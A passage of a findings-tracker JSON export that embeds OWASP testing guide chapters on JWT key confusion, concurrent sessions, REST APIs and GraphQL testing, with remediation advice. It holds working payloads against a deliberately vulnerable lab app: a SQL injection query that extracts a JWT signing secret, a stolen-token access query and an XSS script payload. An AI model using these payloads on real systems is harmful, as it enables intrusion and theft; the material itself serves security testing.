\u0060ESxxx\u0060).\n2. The application must not check which algorithm the JWT is actually using for the signature.\n3. The public key used to verify the JWT must be available to the attacker.\n\nIf all of these conditions are true, then an attacker can use the public key to sign the JWT using a HMAC based algorithm (such as \u0060HS256\u0060). For example, the [Node.js jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) library uses the same function for both public key and HMAC based tokens, as shown in the example below:\n\n\u0060\u0060\u0060\n// Verify a JWT signed using RS256\njwt.verify(token, publicKey);\n\n// Verify a JWT signed using HS256\njwt.verify(token, secretKey);\n\u0060\u0060\u0060\n\nThis means that if the JWT is signed using \u0060publicKey\u0060 as a secret key for the \u0060HS256\u0060 algorithm, the signature will be considered valid.\nIn order to exploit this issue, the public key must be obtained. The most common way this can happen is if the application re-uses the same key for both signing JWTs and as part of the TLS certificate. In this case, the key can be downloaded from the server using a command such as the following:\n\n\u0060\u0060\u0060\nopenssl s_client -connect example.org:443 | openssl x509 -pubkey -noout\n\u0060\u0060\u0060\n\nAlternatively, the key may be available from a public file on the site at a common location such as \u0060/.well-known/jwks.json\u0060.\nIn order to test this, modify the contents of the JWT, and then use the previously obtained public key to sign the JWT using the \u0060HS256\u0060 algorithm. This is often difficult to perform when testing without access to the source code or implementation details, because the format of the key must be identical to the one used by the server, so issues such as empty space or CRLF encoding may result in the keys not matching.\n\n### Attacker Provided Public Key\n\nThe [JSON Web Signature (JWS) standard](https://tools.ietf.org/html/rfc7515) (which defines the header and signatures used by JWTs) allows the key used to sign the token to be embedded in the header. If the library used to validate the token supports this, and doesn\u2019t check the key against a list of approved keys, this allows an attacker to sign an JWT with an arbitrary key that they provide.\nThere are a variety of scripts that can be used to do this, such as [jwk-node-jose.py](https://github.com/zi0Black/POC-CVE-2018-0114) or [jwt_tool](https://github.com/ticarpi/jwt_tool).\n\n## Related Test Cases\n\n* [Testing for Sensitive Information Sent via Unencrypted Channels](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels).\n* [Testing for Cookie Attributes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes).\n* [Testing Browser Storage](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage).\n\n## \n\n## Tools\n\n* [John the Ripper](https://github.com/openwall/john)\n* [jwt2john](https://github.com/Sjord/jwtcrack)\n* [jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)\n* [JSON Web Tokens Burp Extension](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)\n* [ZAP JWT Add-on](https://github.com/SasanLabs/owasp-zap-jwt-addon)","Details":null,"Implication":null,"Recommendation":"## Remediation\n\n* Use a secure and up to date library to handle JWTs.\n* Ensure that the signature is valid, and that it is using the expected algorithm.\n* Use a strong HMAC key or a unique private key to sign them.\n* Ensure that there is no sensitive information exposed in the payload.\n* Ensure that JWTs are securely stored and transmitted.\n* See the [OWASP JSON Web Tokens Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html).","References":"* [RFC 7515 JSON Web Signature (JWS)](https://tools.ietf.org/html/rfc7515)\n* [RFC 7519 JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)\n* [OWASP JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-SESS-11 Testing for Concurrent Sessions","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":null,"TestingInstructions":"## Test Objectives\n\n* Evaluate the application\u2019s session management by assessing the handling of multiple active sessions for a single user account.\n\n## How to Test\n\n1. **Generate Valid Session:**\n    * Submit valid credentials (username and password) to create a session.\n    * Example HTTP Request:\n\n        \u0060\u0060\u0060\n        POST /login HTTP/1.1\n        Host: www.example.com\n        Content-Length: 32\n        \n        username=admin\u0026password=admin123\n        \n        \u0060\u0060\u0060\n    * Example Response:\n\n        \u0060\u0060\u0060\n        HTTP/1.1 200 OK\n        Set-Cookie: SESSIONID=0add0d8eyYq3HIUy09hhus; Path=/; Secure\n        \n        \u0060\u0060\u0060\n    * Store the generated authentication cookie. In some cases, the generated authentication cookie is replaced by tokens such as JSON Web Tokens (JWT).\n2. **Test for Generating Active Sessions:**\n    * Attempt to create multiple authentication cookies by submitting login requests (e.g., one hundred times).\n\n    Note: Utilizing private browsing mode or multi-account containers might be beneficial for conducting these tests, as they can provide separate environments for testing session management without interference from existing sessions or cookies stored in the browser.\n3. **Test for Validating Active Sessions:**\n    * Try accessing the application using the initial session token (e.g., \u0060SESSIONID=0add0d8eyYq3HIUy09hhus\u0060).\n    * If successful authentication occurs with the first generated token, consider it a potential issue indicating inadequate session management.\n\nAlso, there are additional test cases that extend the scope of the testing methodology to include scenarios involving multiple sessions originating from various IPs and locations. These test cases aid in identifying potential vulnerabilities or irregularities in session handling related to geographical or network-based factors:\n\n* Test Multiple sessions from the same IP.\n* Test Multiple sessions from different IPs.\n* Test Multiple sessions from locations that are unlikely or impossible to be visited by the same user in a short period of time (e.g., one session created in a specific country, followed by another session generated five minutes later from a different country).\n\n## Recommended Tools\n\n### Intercepting Proxy Tools\n\n* [Zed Attack Proxy](https://www.zaproxy.org/)\n* [Burp Suite Web Proxy](https://portswigger.net/)","Details":null,"Implication":null,"Recommendation":"The application should monitor and limit the number of active sessions per user account. If the maximum allowed sessions are surpassed, the system must invalidate previous sessions to maintain security. Implementing additional solutions can further mitigate this vulnerability:\n\n1. **User Notification:** Notify users after each successful login to raise awareness of active sessions.\n2. **Session Management Page:** Create a dedicated page to display and allow termination of active sessions for enhanced user control.\n3. **IP Address Tracking:** Track the IP addresses of users who log in to an account and flag any suspicious activity, such as multiple logins from different locations.\n4. **IP Address Restrictions:** Allow users to specify trusted IP addresses or ranges from which they can access their accounts, enhancing security by restricting sessions to known and approved locations.","References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"## Summary\n\nConcurrent sessions are a common aspect of web applications that enable multiple simultaneous user interactions. This test case aims to evaluate the application\u2019s ability to handle multiple active sessions for a single user. This functionality is essential for effectively managing concurrent user sessions, particularly in sensitive areas such as admin panels containing Personally Identifiable Information (PII), personal user accounts, or APIs reliant on third-party services to enrich user-provided data. The primary objective is to ensure that concurrent sessions align with the application\u2019s security requirements.\nUnderstanding the security needs in an application is key to assessing whether enabling concurrent sessions corresponds with the intended features. Allowing concurrent sessions isn\u2019t inherently detrimental and is intentionally permitted in many applications. However, it is crucial to ensure that the application\u2019s functionality is effectively aligned with its security measures concerning concurrent sessions. If concurrent sessions are intended, it is vital to ensure additional security controls, such as managing active sessions, terminating sessions, and potential new session notifications. Conversely, if concurrent sessions are not intended or planned within the application, it is crucial to validate existing checks for session management vulnerabilities.\nTo recognize that concurrent sessions are essential, you should consider the following factors:\n\n* Understanding the application\u2019s nature, particularly situations where users might require simultaneous access from different locations or devices.\n* Identifying critical operations, such as financial transactions that require secure access.\n* Handling sensitive data like Personally Identifiable Information (PII), indicating the necessity for secure interactions.\n* Distinguishing between a management panel and a standard user dashboard for normal user access.","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"06-Session Management Testing","Description":"06-Session Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"23212627-d01d-4ff1-a6cc-378480f3cd7a","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-APIT-00 API Testing Overview","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/00-API_Testing_Overview","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/00-API_Testing_Overview","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":null,"TestingInstructions":"## Web API Introduction\n\nA Web Application Programming Interface (API) facilitates communication and data exchange between different software systems over a network or the internet. Web APIs enable different applications to interact with each other in a standardized and efficient manner, allowing them to leverage each other\u2019s functionalities and data.\nThe adoption of different technologies such as cloud computing, microservice architectures, and single page applications have all contributed to the adoption of APIs as an architectural movement.\nAs with the introduction of any new concepts, there can be flaws and vulnerabilities that necessitate testing. Otherwise, poorly secured APIs may provide an unrestricted direct path to sensitive data.\nThis chapter attempts to guide the security researcher in the concepts necessary for testing APIs. This section in particular investigates the different API technologies and their history.\n\n## Which API Technology?\n\nBefore we make assumptions about the type of API we are testing, it can be helpful to be aware of the full scope of the problem space that the security researcher may encounter. These include:\n\n1. Representational State Transfer (REST) APIs\n2. Simple Object Access Protocol (SOAP) APIs\n3. GraphQL APIs\n4. gRPC Remote Procedure Calls (gRPC)\n5. WebSockets APIs\n\n## REST (Representational State Transfer) APIs\n\n### What is REST?\n\nREST is a set of rules and conventions for interacting with web resources. The key components of URI, HTTP Methods, Headers, and Status Codes support the principles of REST.\n\n### History\n\nDue to their simplicity, scalability, and compatibility with existing web infrastructure, REST based APIs have become the most common API architecture on the internet at the time of this writing. REST based APIs did not immediately manifest, but rather have a long path from research to adoption.\nIn 1994 Roy Fielding, one of the principal authors of the HTTP specification, began his work on REST as part of his doctoral dissertation at the University of California, Irvine. By 2000, he published his dissertation, [Architectural Styles and the Design of Network-based Software Architectures](https://ics.uci.edu/~fielding/pubs/dissertation/top.htm), where he introduced and defined REST as an architectural style. REST was designed to take advantage of the existing features of HTTP, emphasizing scalability, stateless interactions, and a uniform interface.\nIn the 2010s REST became the de facto standard for web APIs due to its simplicity and compatibility with the web\u2019s underlying architecture. The widespread use of RESTful APIs was driven by the growth of mobile applications, cloud computing, and microservices architecture. The development of tools and frameworks like Swagger/OpenAPI, RAML, and API Blueprint facilitated the design, documentation, and testing of REST APIs.\nBy the 2020s modern developments evolved REST with technologies such as GraphQL. In addition, the OpenAPI/Swagger specification became a widely adopted standard for describing REST APIs, enabling better integration and automation.\n\n### Uniform Resource Identifiers\n\nREST APIs use Uniform Resource Identifiers (URIs) to access resources. URIs are a crucial element of a REST Architecture. A URI is a string of characters that uniquely identifies a particular resource. URIs are used extensively on the internet to locate and interact with resources, such as web pages, files, and services.\nA URI consists of several components, each serving a specific purpose. The generic URI syntax as defined in [RFC3986](https://tools.ietf.org/html/rfc3986) is below:\n\n\u003E \u0060URI = scheme \u0022://\u0022 authority \u0022/\u0022 path [ \u0022?\u0022 query ] [ \u0022#\u0022 fragment ]\u0060\n\nFor REST, the **scheme** is typically \u0060HTTP\u0060 or \u0060HTTPS\u0060 but generically indicates the protocol or method used to access the resource. Other common schemes include \u0060ftp\u0060, \u0060mailto\u0060, and \u0060file\u0060.\nThe **authority** specifies the domain name or IP address of the server where the resource resides, and may include a port number. It may also include userinfo as a subcomponent.\nThe **path** specifies the specific location of the resource on the server. We are interested in the path of URI as the relationship between user and resources. For example, \u0060https://api.example.com/admin/testing/report\u0060 may show a test report. There is relationship between the user admin and their reports.\nThe path of any URI will define a REST API resource model. Resources are separated by a forward slash and based on Top-Down design.\nFor example:\n\n* \u0060https://api.example.com/admin/testing/report\u0060\n* \u0060https://api.example.com/admin/testing/\u0060\n* \u0060https://api.example.com/admin/\u0060\n\nThe **query** provides additional parameters for the resource. It starts with a \u0060?\u0060 and consists of key-value pairs separated by \u0060\u0026\u0060.\nThe **fragment** indicates a specific part of the resource, such as a section within a web page. It starts with a \u0060#\u0060. It\u2019s worth noting that fragment identifiers are only processed client-side and not sent to the server.\n\n### HTTP Methods\n\nREST APIs use standard HTTP methods to perform operations on resources following the [HTTP Request Methods](https://tools.ietf.org/html/rfc7231#section-4) defined in [RFC7231](https://tools.ietf.org/html/rfc7231). These methods map to CRUD, the four basic functions of persistent storage in computer science. CRUD stands for Create, Read, Update, and Delete, which are the four operations that can be performed on data.\nHTTP Request Methods are:\n\n| Methods | Description |\n| ------- | ----------- |\n| GET | Get the representation of resource\u2019s state |\n| POST | Create a new resource |\n| PUT | Update a resource |\n| DELETE | Remove a resource |\n| HEAD | Get metadata associated with resource\u2019s state |\n| OPTIONS | List available methods |\n\n#### Headers\n\nREST relies on headers to support communication of additional information within the request or response. These include:\n\n* \u0060Content-Type\u0060: Indicates the media type of the resource (e.g. \u0060application/json\u0060).\n* \u0060Authorization\u0060: Contains credentials for authentication (e.g. tokens).\n* \u0060Accept\u0060: Specifies the media types that are acceptable for the response.\n\n#### Status Codes\n\nApplication APIs that conform to REST principles use the response status code of an HTTP response message to notify the client about their request\u2019s result.\n\n| Response Code | Response Message | Description |\n| ------------- | ---------------- | ----------- |\n| 200 | OK | Success while processing client\u2019s request |\n| 201 | Created | New resource created |\n| 301 | Moved Permanently | Permanent redirection |\n| 304 | Not Modified | Caching related response that returned when the client has the same copy of the resource as the server |\n| 307 | Temporary Redirect | Temporary redirection of resource |\n| 400 | Bad Request | Malformed request by the client |\n| 401 | Unauthorized | Client is not allowed to make requests or access a particular resource |\n| 402 | Forbidden | Client is forbidden to access the resource |\n| 404 | Not Found | Resource doesn\u2019t exist or incorrect based on the request |\n| 405 | Method Not Allowed | Invalid method or unknown method used |\n| 500 | Internal Server Error | Server failed to process request due to an internal error |\n","Details":null,"Implication":null,"Recommendation":null,"References":"1. [OWASP REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)\n2. [OWASP REST Assessment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html)\n3. [OWASP API Security Project](https://owasp.org/www-project-api-security/)\n4. [OWASP API Security Tools](https://owasp.org/www-community/api_security_tools)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"12-API Testing","Description":"12-API Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"97a8eae3-9d82-4cbf-ac05-2a640c07d95b","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-APIT-01 Testing GraphQL","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"GraphQL has become very popular in modern APIs. It provides simplicity and nested objects, which facilitate faster development. While every technology has advantages, it can also expose the application to new attack surfaces. The purpose of this scenario is to provide some common misconfigurations and attack vectors on applications that utilize GraphQL. Some vectors are unique to GraphQL (e.g. [Introspection Query](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL#introspection-queries)) and some are generic to APIs (e.g. [SQL injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL#sql-injection)).\nExamples in this section will be based on a vulnerable GraphQL application [poc-graphql](https://github.com/righettod/poc-graphql), which is run in a docker container that maps \u0060localhost:8080/GraphQL\u0060 as the vulnerable GraphQL node.","TestingInstructions":"## Test Objectives\n\n* Assess that a secure and production-ready configuration is deployed.\n* Validate all input fields against generic attacks.\n* Ensure that proper access controls are applied.\n\n## How to Test\n\nTesting GraphQL nodes is not very different than testing other API technologies. Consider the following steps:\n\n### Introspection Queries\n\nIntrospection queries are the method by which GraphQL lets you ask what queries are supported, which data types are available, and many more details you will need when approaching a test of a GraphQL deployment.\nThe [GraphQL website describes Introspection](https://graphql.org/learn/introspection/):\n\n\u003E \u201CIt\u2019s often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!\u201D\n\nThere are a couple of ways to extract this information and visualize the output, as follows.\n\n#### Using Native GraphQL Introspection\n\nThe most straightforward way is to send an HTTP request (using a personal proxy) with the following payload, taken from an article on [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696):\n\n\u0060\u0060\u0060\nquery IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\u0060\u0060\u0060\n\nThe result will usually be very long (and hence has been shortened here), and it will contain the entire schema of the GraphQL deployment.\nResponse:\n\n\u0060\u0060\u0060\n{\n  \u0022data\u0022: {\n    \u0022__schema\u0022: {\n      \u0022queryType\u0022: {\n        \u0022name\u0022: \u0022Query\u0022\n      },\n      \u0022mutationType\u0022: {\n        \u0022name\u0022: \u0022Mutation\u0022\n      },\n      \u0022subscriptionType\u0022: {\n        \u0022name\u0022: \u0022Subscription\u0022\n      },\n      \u0022types\u0022: [\n        {\n          \u0022kind\u0022: \u0022ENUM\u0022,\n          \u0022name\u0022: \u0022__TypeKind\u0022,\n          \u0022description\u0022: \u0022An enum describing what kind of type a given __Type is\u0022,\n          \u0022fields\u0022: null,\n          \u0022inputFields\u0022: null,\n          \u0022interfaces\u0022: null,\n          \u0022enumValues\u0022: [\n            {\n              \u0022name\u0022: \u0022SCALAR\u0022,\n              \u0022description\u0022: \u0022Indicates this type is a scalar.\u0022,\n              \u0022isDeprecated\u0022: false,\n              \u0022deprecationReason\u0022: null\n            },\n            {\n              \u0022name\u0022: \u0022OBJECT\u0022,\n              \u0022description\u0022: \u0022Indicates this type is an object. \u0060fields\u0060 and \u0060interfaces\u0060 are valid fields.\u0022,\n              \u0022isDeprecated\u0022: false,\n              \u0022deprecationReason\u0022: null\n            },\n            {\n              \u0022name\u0022: \u0022INTERFACE\u0022,\n              \u0022description\u0022: \u0022Indicates this type is an interface. \u0060fields\u0060 and \u0060possibleTypes\u0060 are valid fields.\u0022,\n              \u0022isDeprecated\u0022: false,\n              \u0022deprecationReason\u0022: null\n            },\n            {\n              \u0022name\u0022: \u0022UNION\u0022,\n              \u0022description\u0022: \u0022Indicates this type is a union. \u0060possibleTypes\u0060 is a valid field.\u0022,\n              \u0022isDeprecated\u0022: false,\n              \u0022deprecationReason\u0022: null\n            },\n          ],\n          \u0022possibleTypes\u0022: null\n        }\n      ]\n    }\n  }\n}\n\u0060\u0060\u0060\n\nA tool such as [GraphQL Voyager](https://apis.guru/graphql-voyager/) can be used to get a better understanding of the GraphQL endpoint:\n![GraphQL Voyager](Image Not Found)\n*Figure 12.1-1: GraphQL Voyager*\nThis tool creates an Entity Relationship Diagram (ERD) representation of the GraphQL schema, allowing you to get a better look into the moving parts of the system you\u2019re testing. Extracting information from the drawing allows you to see you can query the Dog table for example. It also shows which properties a Dog has:\n\n* ID\n* name\n* veterinary (ID)\n\nThere is one downside to using this method: GraphQL Voyager does not display everything that can be done with GraphQL. For example, the mutations available are not listed in the drawing above. A better strategy would be to use both Voyager and one of the methods listed below.\n\n#### Using GraphiQL\n\n[GraphiQL](https://github.com/graphql/graphiql) is a web-based IDE for GraphQL. It is part of the GraphQL project, and it is mainly used for debugging or development purposes. The best practice is to not allow users to access it on production deployments. If you are testing a staging environment, you might have access to it and can thus save some time when working with introspection queries (although you can, of course, use introspection in the GraphiQL interface).\nGraphiQL has a documentation section, which uses the data from the schema in order to create a document of the GraphQL instance that is being used. This document contains the data types, mutations, and basically every piece of information that can be extracted using introspection.\n\n#### Using GraphQL Playground\n\n[GraphQL Playground](https://github.com/graphql/graphql-playground) is a GraphQL client. It can be used to test different queries, as well as divide GraphQL IDEs into different playgrounds, and group them by theme or by assigning a name to them. Much like GraphiQL, Playground can create documentation for you without the need for manually sending introspection queries and processing the response(s). It has another great advantage: It doesn\u2019t need the GraphiQL interface to be available. You can direct the tool to the GraphQL node via a URL, or use it locally with a data file. GraphQL Playground can be used to test for vulnerabilities directly, so you don\u2019t need to use a personal proxy to send HTTP requests. This means you can use this tool for simple interaction with and assessment of GraphQL. For other more advanced payloads, use a personal proxy.\nNote that in some cases, you will need to set the HTTP headers at the bottom, to include session ID or other mechanism of authentication. This still allows creating multiple \u201CIDEs\u201D with different permissions to verify if there are in fact authorization issues.\n![Playground1](Image Not Found)\n*Figure 12.1-2: GraphQL Playground High Level API Docs*\n![Playground2](Image Not Found)\n*Figure 12.1-3: GraphQL Playground API Schema*\nYou can even download the schemas to use in Voyager.\n\n#### Introspection Conclusion\n\nIntrospection is a useful tool that allows users to gain more information about the GraphQL deployment. However, this will also allow malicious users to gain access to the same information. The best practice is to limit access to the introspection queries, since some tools or requests might fail if this feature is disabled altogether. As GraphQL usually bridges to the backend APIs of the system, it\u2019s better to enforce strict access control.\n\n### Authorization\n\nIntrospection is the first place to look for authorization problems. As noted, access to introspection should be restricted as it allows for data extraction and data gathering. Once a tester has access to the schema and knowledge of the sensitive information there is to extract, they should then send queries that will not be blocked due to insufficient privileges. GraphQL does not enforce permissions by default, and so it is up to the application to perform authorization enforcement.\nIn the earlier examples, the output of the introspection query shows there is a query called \u0060auth\u0060. This seems like a good place to extract sensitive information such as API tokens, passwords, etc.\n![Auth GraphQL Query](Image Not Found)\n*Figure 12.1-4: GraphQL Auth Query API*\nTesting the authorization implementation varies from deployment to deployment since each schema will have different sensitive information, and hence, different targets to focus on.\nIn this vulnerable example, every user (even unauthenticated) can gain access to the auth tokens of every veterinarian listed in the database. These tokens can be used to perform additional actions the schema allows, such as associating or disassociating a dog from any specified veterinarian using mutations, even if there is no matching auth token for the veterinarian in the request.\nHere is an example in which the tester uses an extracted token they do not own to perform an action as the veterinarian \u201CBenoit\u201D:\n\n\u0060\u0060\u0060\nquery brokenAccessControl {\n  myInfo(accessToken:\u0022eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew\u0022, veterinaryId: 2){\n    id, name, dogs {\n      name\n    }\n  }\n}\n\u0060\u0060\u0060\n\nAnd the response:\n\n\u0060\u0060\u0060\n{\n  \u0022data\u0022: {\n    \u0022myInfo\u0022: {\n      \u0022id\u0022: 2,\n      \u0022name\u0022: \u0022Benoit\u0022,\n      \u0022dogs\u0022: [\n        {\n          \u0022name\u0022: \u0022Babou\u0022\n        },\n        {\n          \u0022name\u0022: \u0022Baboune\u0022\n        },\n        {\n          \u0022name\u0022: \u0022Babylon\u0022\n        },\n        {\n          \u0022name\u0022: \u0022...\u0022\n        }\n      ]\n    }\n  }\n}\n\u0060\u0060\u0060\n\nAll of the Dogs in the list belong to Benoit, and not to the auth token owner. It\u2019s possible to perform this type of action when proper authorization enforcement is not implemented.\n\n### Injection\n\nGraphQL is the implementation of the API layer of an application, and as such, it usually forwards the requests to a backend API or the database directly. This allows you to utilize any underlying vulnerability such as SQL injection, command injection, cross-site scripting, etc. Using GraphQL just changes the entry point of the malicious payload.\nYou can refer to other scenarios within the OWASP testing guide to get some ideas.\nGraphQL also has scalars, which are usually used for custom data types that do not have native data types, such as DateTime. These types of data do not have out-of-the-box validation, making them good candidates for testing.\n\n#### SQL Injection\n\nThe example application is vulnerable by design in the query \u0060dogs(namePrefix: String, limit: Int = 500): [Dog!]\u0060 since the parameter \u0060namePrefix\u0060 is concatenated in the SQL query. Concatenating user input is a common malpractice of applications that can expose them to SQL injection.\nThe following query extracts information from the \u0060CONFIG\u0060 table within the database:\n\n\u0060\u0060\u0060\nquery sqli {\n  dogs(namePrefix: \u0022ab%\u0027 UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- \u0022, limit: 1000) {\n    id\n    name\n  }\n}\n\u0060\u0060\u0060\n\nThe response to this query is:\n\n\u0060\u0060\u0060\n{\n  \u0022data\u0022: {\n    \u0022dogs\u0022: [\n      {\n        \u0022id\u0022: 1,\n        \u0022name\u0022: \u0022Abi\u0022\n      },\n      {\n        \u0022id\u0022: 2,\n        \u0022name\u0022: \u0022Abime\u0022\n      },\n      {\n        \u0022id\u0022: 3,\n        \u0022name\u0022: \u0022...\u0022\n      },\n      {\n        \u0022id\u0022: 50,\n        \u0022name\u0022: \u0022$Nf!S?(.}DtV2~:Txw6:?;D!M\u002BZ34^\u0022\n      }\n    ]\n  }\n}\n\u0060\u0060\u0060\n\nThe query contains the secret that signs JWTs in the example application, which is very sensitive information.\nIn order to know what to look for in any particular application, it will be helpful to collect information about how the application is built and how the database tables are organized. You can also use tools like \u0060sqlmap\u0060 to look for injection paths and even automate the extraction of data from the database.\n\n#### Cross-Site Scripting (XSS)\n\nCross-site scripting occurs when an attacker injects executable code that is subsequently run by the browser. Learn about tests for XSS in the [Input Validation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README) chapter. You may test for reflected XSS using a payload from [Testing for Reflected Cross Site Scripting](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting).\nIn this example, errors might reflect the input and could cause XSS to occur.\nPayload:\n\n\u0060\u0060\u0060\nquery xss  {\n  myInfo(veterinaryId:\u0022\u003Cscript\u003Ealert(\u00271\u0027)\u003C/script\u003E\u0022 ,accessToken:\u0022\u003Cscript\u003Ealert(\u00271\u0027)\u003C/script\u003E\u0022) {\n    id\n    name\n  }\n}\n\u0060\u0060\u0060\n\nResponse:\n\n\u0060\u0060\u0060\n{\n  \u0022data\u0022: null,\n  \u0022errors\u0022: [\n    {\n      \u0022message\u0022: \u0022Validation error of type WrongType: argument \u0027veterinaryId\u0027 with value \u0027StringValue{value=\u0027\u003Cscript\u003Ealert(\u00271\u0027)\u003C/script\u003E\u0027}\u0027 is not a valid \u0027Int\u0027 @ \u0027myInfo\u0027\u0022,\n      \u0022locations\u0022: [\n        {\n          \u0022line\u0022: 